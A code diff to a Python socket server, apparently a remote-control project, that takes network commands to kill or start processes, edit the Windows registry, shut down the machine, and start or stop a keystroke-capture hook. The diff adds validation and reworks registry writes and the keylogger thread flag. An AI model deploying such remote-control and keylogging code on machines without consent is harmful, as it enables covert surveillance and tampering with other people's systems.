@@ -303,9 +303,19 @@ def handle_getvalue(state, path, name):
 
 def handle_setvalue(state, path, name, value, type_INT):
     try:
-        winreg.CreateKey(state, path)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_ALL_ACCESS)
+        val = winreg.QueryValueEx(key, name)
+        winreg.CloseKey(key)
+        if val[1] != type_INT:
+            return False
+    except:
+        return False
+
+    try:
+
         registry_key = winreg.OpenKey(state, path, 0,
                                       winreg.KEY_WRITE)
+
         winreg.SetValueEx(registry_key, name, 0, type_INT, value)
         winreg.CloseKey(registry_key)
         return True
@@ -372,6 +382,8 @@ def handle_registry(list_mes):
         state = winreg.HKEY_USERS
     elif subpath[0] == 'HKEY_CURRENT_CONFIG':
         state = winreg.HKEY_CURRENT_CONFIG
+    else:
+        return False
 
     global type_INT
     if datatype == 'STRING':
@@ -388,10 +400,15 @@ def handle_registry(list_mes):
         type_INT = winreg.REG_MULTI_SZ
     elif datatype == 'EXPANDABLE STRING':
         type_INT = winreg.REG_EXPAND_SZ
+    elif datatype == "DATATYPE":
+        return False
+
 
     if mode == "GETVALUE":
         return handle_getvalue(state, subpath[1], name)
     elif mode == "SETVALUE":
+        if name == "" or value == "":
+            return False
         return handle_setvalue(state, subpath[1], name, value, type_INT)
     elif mode == "DELETEVALUE":
         return handle_deletevalue(state, subpath[1], name)
@@ -399,6 +416,8 @@ def handle_registry(list_mes):
         return handle_createkey(state, subpath[1])
     elif mode == "DELETEKEY":
         return handle_deletekey(state, subpath[1])
+    else:
+        return False
 
 
 # ---------tatmay
@@ -433,7 +452,11 @@ def handle_tatmay():
 
 
 # ---------client
+global state_keystroke
+
+
 def handle_client(conn, addr):
+    global state_keystroke
     global Flag
     print(f"[NEW CONNECTION] {addr} connected ")
     connected = True
@@ -457,11 +480,15 @@ def handle_client(conn, addr):
             elif msg == MESSAGE_PR:
                 handle_process(conn)
             elif list_mes[0] == "KILL":
-                send_process(conn, str(handle_kill(list_mes[1])))
-                handle_process(conn)
+                str_data = handle_kill(list_mes[1])
+                send_process(conn, str(str_data))
+                if str(str_data) == "True":
+                    handle_process(conn)
+
             elif list_mes[0] == "START":
                 handle_start(conn, list_mes[1])
             elif list_mes[0] == "KEYSTROKE":
+                state_keystroke = 1
                 thread = threading.Thread(target=handle_keystroke)
                 thread.start()
             elif list_mes[0] == "INPHIM":
@@ -470,10 +497,13 @@ def handle_client(conn, addr):
                 # ------------
                 send_process(conn, str(handle_inphim()))
                 # -----------------
-                thread = threading.Thread(target=handle_keystroke)
-                thread.start()
+                if state_keystroke == 1:
+                    thread = threading.Thread(target=handle_keystroke)
+                    thread.start()
+
 
             elif list_mes[0] == "UNHOOK":
+                state_keystroke = 0
                 handle_unhook()
             elif list_mes[0] == "REGISTRY":
                 send_process(conn, str(handle_registry(list_mes)))
@@ -482,8 +512,10 @@ def handle_client(conn, addr):
             elif list_mes[0] == "STARTAPP":
                 handle_start_app(conn, list_mes[1])
             elif list_mes[0] == "KILLAPP":
-                send_process(conn, str(handle_kill_app(list_mes[1])))
-                handle_app(conn)
+                str_dataapp = handle_kill_app(list_mes[1])
+                send_process(conn, str(str_dataapp))
+                if str(str_dataapp) == "True":
+                    handle_app(conn)
             elif list_mes[0] == "TATMAY":
                 handle_tatmay()
 
